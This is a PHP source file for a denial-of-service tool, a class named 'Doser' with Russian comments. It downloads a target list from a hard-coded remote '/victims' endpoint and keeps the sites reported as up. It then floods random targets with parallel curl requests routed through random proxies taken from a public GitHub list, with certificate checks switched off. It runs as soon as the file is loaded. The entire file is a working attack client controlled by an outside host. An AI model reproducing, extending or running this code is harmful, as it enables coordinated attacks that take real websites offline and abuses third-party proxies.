<?php
class Doser {

	var $source='http://164.92.247.88:9300/victims'; //список сайтов в json
	var $proxylist='https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt'; // список прокси с гитхаба
	var $useProxy=true;
	var $threads=5;
	var $showResult=0;
	var $pages;
	var $proxy;

	public function __construct() {
	
		$arrContextOptions=array(
    	  "ssl"=>array(
        	    "verify_peer"=>false,
	            "verify_peer_name"=>false,
    	    ),
	    );  
		$r=$this->get('dd_pages',300);
		if (!$r) {
			try{ 
				$this->pages=json_decode(file_get_contents($this->source, false, stream_context_create($arrContextOptions)));
				$this->set('dd_pages',$this->pages);
			} catch(Exception $e) {
				$this->pages=$this->get('dd_pages',300,1);
			}
		} else {
			$this->pages=$r;
		}
		$e=array();
		foreach($this->pages->statuses as $k=>$v) {
			if($v->status=='UP') $e[]=$this->pages->statuses[$k];
		}
		$this->pages=$e;

		if($this->useProxy) {
			$r=$this->get('dd_proxy',600);
			if (!$r) {
				try{ 
					$l=file_get_contents($this->proxylist, false, stream_context_create($arrContextOptions));
					$this->proxy=preg_split("/[\n\r]+/",trim($l));
					$this->set('dd_proxy',$this->proxy);
				} catch(Exception $e) {
					$this->proxy=$this->get('dd_proxy',600,1);
				}
			} else {
				$this->proxy=$r;
			}
		}
		$this->gethttp();
	}

	function gethttp() {

		$sites=0;
		$proxLength=count($this->proxy);
		$multi_init = curl_multi_init();
		$job = array();

		$l=count($this->pages);

		for($i=0;$i<$this->threads;$i++) {
			$rand=rand(0,$l-1);
			$page=trim($this->pages[$rand]->url);

			$init = curl_init($page);
			curl_setopt($init, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($init, CURLOPT_RETURNTRANSFER, 1);
			if($proxLength)  {
				$phost=$this->proxy[rand(0,$proxLength)];
//				if(strstr($phost,'@')) {
//					list($pwd,$phost)=explode('@',$phost);
//				    curl_setopt($init, CURLOPT_PROXYUSERPWD, $phost->auth);
//				} else {
//				    curl_setopt($init, CURLOPT_PROXYUSERPWD, NULL);
//				}
				curl_setopt($init, CURLOPT_PROXY, $phost);
			}
			curl_setopt($init, CURLOPT_CONNECTTIMEOUT, 10);

			curl_setopt($init, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($init, CURLOPT_ENCODING, "gzip");
			curl_setopt($init, CURLOPT_TIMEOUT, 10);
			curl_setopt($init, CURLOPT_HEADER, 1);
			$job[$page] = $init;
			curl_multi_add_handle($multi_init, $init);
		}

		$thread = null;
		do {
			$thread_exec = curl_multi_exec($multi_init, $thread);
		}
		while ($thread_exec == CURLM_CALL_MULTI_PERFORM);

		while ($thread && ($thread_exec == CURLM_OK)) {
			if (curl_multi_select($multi_init) != -1) {

			do {

				$thread_exec = curl_multi_exec($multi_init, $thread);

				$info = curl_multi_info_read($multi_init);

				if ($info['msg'] == CURLMSG_DONE) {

					$init = $info['handle'];
					if($this->showResult) {
						$init = $info['handle'];
						$page = array_search($init, $job);
						$rrt = curl_multi_getcontent($init);
						$ll=mb_strlen($rrt,'UTF-8');
						echo $page.' - '.($ll>100?'DOWN':'UP')."\n";
					}
					curl_multi_remove_handle($multi_init, $init);
					curl_close($init);
				}
			}
			while ($thread_exec == CURLM_CALL_MULTI_PERFORM);
			}
		}
		curl_multi_close($multi_init);
	}

	public function get($key,$delay=300,$notime=false) {
		$file=__DIR__.'/'.$key;
		if(file_exists($file)) {
			if(filemtime($file)+$delay > time() || $notime){
				$c=unserialize(file_get_contents($file));
				return $c;
			} else {
				return false;
			}
		}
		return false;
	}

	public function set($key,$data) {
		$file=__DIR__.'/'.$key;
		@file_put_contents($file, serialize($data));
		touch($file,time());
	}


}
$Doser=new Doser();
